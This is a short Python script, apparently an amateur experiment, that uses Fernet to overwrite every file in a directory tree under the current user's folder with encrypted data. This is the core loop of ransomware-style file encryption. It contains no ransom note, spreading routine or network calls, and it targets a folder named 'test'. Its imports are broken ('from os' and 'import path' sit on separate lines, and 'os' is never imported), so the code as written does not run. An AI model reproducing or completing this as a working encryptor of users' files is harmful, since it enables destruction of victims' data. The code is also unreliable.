from cryptography.fernet import Fernet
from os
import path

def write_key():
	key = Fernet.generate_key()
	with open('key.key', "wb") as key_file:
		key_file.write(key)

def load_key():
	file = open('key.key', 'rb')
	key_read = file.read()
	file.close()
	return key_read


key = load_key()
fer = Fernet(key)

os.chdir(r"C:\Users\{user}\encript\test".format(user=os.getlogin()))

for root, dir, files in os.walk('.'):
	print(files)
	for filename in files:
		filepath = path.join(root, filename)
		
		with open(filepath, 'rb') as f:
			data = f.read()
		
		with open(filepath, 'w') as f:
			print(len(data))
			f.write(fer.encrypt(data).decode())
			print('done')
